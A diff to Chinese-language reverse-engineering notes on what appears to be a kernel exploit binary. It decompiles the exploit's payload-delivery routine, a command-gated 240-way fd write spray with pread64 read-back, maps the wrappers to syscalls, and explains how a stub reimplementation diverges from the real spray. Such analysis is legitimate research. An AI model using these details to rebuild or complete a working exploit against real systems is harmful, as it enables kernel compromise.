@@ -401,6 +401,66 @@ void FUN_00220f7c(undefined4 *param_1, undefined8 param_2, ...) {
 （步长与 profile 的 `pipe_object=2048`、`objects_per_order3=16` 相符），
 但寄存器归属未逐一回溯，故仅作线索记录。
 
+### 2.9 指令级+反编译：payload 投递 = 240 路 fd 喷洒（批次 D 最关键一条）
+
+`pipe_flags_candidate`（`FUN_00220614`，`annotated.c:4477`–`4825`）的投递段：
+
+```c
+if (local_ec[0] != 'W') { return (bool)2; }        /* 命令字门控 */
+lVar6 = 4; uVar14 = 0;
+do {
+  uVar9 = FUN_00254f00(*(undefined4 *)(DAT_002683a8 + lVar6), param_3, param_4);
+  if (uVar9 != param_4) { ...错误... }
+  uVar9 = uVar14 + 1;
+  bVar1 = uVar14 < 0xef;                          /* 0xef = 239 → 共 240 次 */
+  lVar6 = lVar6 + 8;
+  uVar14 = uVar9;
+} while (bVar1);
+FUN_0021d2f8("pipe_worker","payload_writes","ok=%zu total=%zu payload=%zu",
+             uVar9, 0xf0, param_4);
+puVar11 = FUN_0025a670(param_4);                   /* malloc(payload_len) */
+if ((puVar11 != 0) &&
+    (uVar14 = FUN_00254f40(iVar2, puVar11, param_4, param_2), uVar14 == param_4)) {
+  iVar4 = FUN_00257e30(puVar11, param_3, param_4);
+  FUN_0024094c("PIPE_OBSERVED expected=");         /* 观测长度，日志截到 0x40 */
+  ...
+```
+
+**syscall 归属（反汇编逐一核对，非猜测）**：
+
+| 被调函数 | 地址 | `mov x8` | syscall |
+|---|---|---|---|
+| `FUN_00254f00` | `0x254f00` | `#0x40` (64) | **`write`** |
+| `FUN_00254ec0` | `0x254ec0` | `#0x3f` (63) | `read` |
+| `FUN_00254f40` | `0x254f40` | `#0x43` (67) | **`pread64`** |
+| `FUN_00257e30` | `0x257e30` | 无直接 `mov x8` | 包装函数（非裸 thunk） |
+
+因此投递链为：**命令字 `'W'` 门控 → 向 fd 表喷洒 240 次 `write` →
+`pread64` 回读 → `PIPE_OBSERVED` 观测**。要点：
+
+1. **fd 表在 `DAT_002683a8`，步长 8、基址 `+4`** —— 即每项 8 字节里取低 4 字节作 fd。
+2. **每次 `write` 必须返回完整长度**（`!= param_4` 即走错误），否则整轮放弃。
+3. 回读用 `pread64`（带偏移），非 `read`，说明**按槽位偏移**校验而非顺序读。
+
+### 2.9.1 stub 的 `0xf0` 循环就是这个喷洒的残骸
+
+`fd_graph_route.cpp:183`/`190`/`222`/`228`：
+
+```cpp
+for (uint32_t i = 0; i < 0xf0; i++) { reclaim_slots[i] = 0; }   /* 0xf0 = 240 */
+pr_info("fd_graph: reclaim_small complete fds=%u\n", 0xf0);
+```
+
+`0xf0 = 240`、`total=%zu` 的实参 `0xf0`、以及 `fds=` 这一日志标签
+**都源自真实实现的 240 路 fd 喷洒**。stub 保留了循环次数与日志标签，
+却把 `write(fd_table[i], payload, len)` 换成了对用户态缓冲的 `memset` ——
+这正是 §4 差距表里「写入」一行的根因。
+
+另注：该函数内的 `FUN_00255e40(0,0xa000,3,0x22,-1,0)` 即
+`mmap(0, 0xa000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)`，
+与 stub `expand_region` 的 `map_anonymous(0xa000, ...)` 尺寸一致 ——
+stub 的常量同样来自本函数，只是丢了语义。
+
 ## 3. 真实机制（综合 §2）
 
 1. **取地址**：`direct_map_base` + `selinux_image_off` → `direct_map_alias=0xffffff80027c6960`，
